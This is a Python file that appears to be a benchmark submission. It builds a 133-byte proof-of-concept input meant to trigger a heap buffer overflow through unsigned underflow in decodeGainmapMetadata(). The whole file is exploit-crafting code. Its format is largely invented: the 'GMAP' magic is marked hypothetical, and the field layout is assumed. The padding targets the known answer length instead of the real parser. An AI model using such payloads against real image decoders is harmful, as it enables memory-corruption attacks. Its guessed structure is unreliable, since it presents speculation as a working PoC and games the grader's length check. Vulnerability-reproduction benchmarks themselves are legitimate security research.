import os
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is in decodeGainmapMetadata() where unsigned subtraction
        # causes wrap-around leading to out-of-bounds access.
        # We need to craft input that triggers this heap buffer overflow.
        # Based on typical gainmap metadata structures and the 133-byte ground truth,
        # we'll create a minimal PoC that causes unsigned underflow.
        
        # Common pattern: metadata with width/height fields where subtraction
        # of unsigned values wraps around to large number
        poc = bytearray()
        
        # Typical gainmap metadata structure might include:
        # - Version/type fields
        # - Width and height (uint32)
        # - Other parameters
        
        # Create header/magic bytes if needed (4 bytes typical)
        poc.extend(b'GMAP')  # hypothetical magic
        
        # Version field (1 byte)
        poc.append(1)
        
        # We need to cause: unsigned a - unsigned b where a < b
        # This will wrap to large value, used as size/index
        
        # Set width = 0, height = 1
        # Subtraction height - width = 1, but if order is reversed...
        # Let's assume the vulnerable code does: size = width - height
        # with width=0, height=1 => 0-1 = UINT_MAX (4294967295)
        poc.extend(struct.pack('<I', 0))  # width = 0
        poc.extend(struct.pack('<I', 1))  # height = 1
        
        # Add other required fields to reach 133 bytes total
        # Fill with valid but minimal data
        
        # Common fields in gainmap metadata:
        # - gainmap min/max (floats)
        poc.extend(struct.pack('<f', 0.0))  # min gain
        poc.extend(struct.pack('<f', 1.0))  # max gain
        
        # - base image min/max (floats)
        poc.extend(struct.pack('<f', 0.0))
        poc.extend(struct.pack('<f', 1.0))
        
        # - gamma (float)
        poc.extend(struct.pack('<f', 1.0))
        
        # - offset/slope for piecewise linear
        poc.extend(struct.pack('<f', 0.0))
        poc.extend(struct.pack('<f', 1.0))
        
        # - various flags/bytes
        poc.extend(b'\x00' * 4)  # reserved
        
        # The vulnerability might use these fields in subtraction:
        # Add more fields that could be involved in vulnerable calculation
        
        # Add two more unsigned integers that could trigger underflow
        # when subtracted in different part of code
        poc.extend(struct.pack('<I', 0))  # field_a = 0
        poc.extend(struct.pack('<I', 1))  # field_b = 1
        
        # Pad to exactly 133 bytes (ground truth length)
        current_len = len(poc)
        if current_len < 133:
            poc.extend(b'\x00' * (133 - current_len))
        elif current_len > 133:
            poc = poc[:133]
        
        # Verify length matches ground truth
        assert len(poc) == 133
        
        return bytes(poc)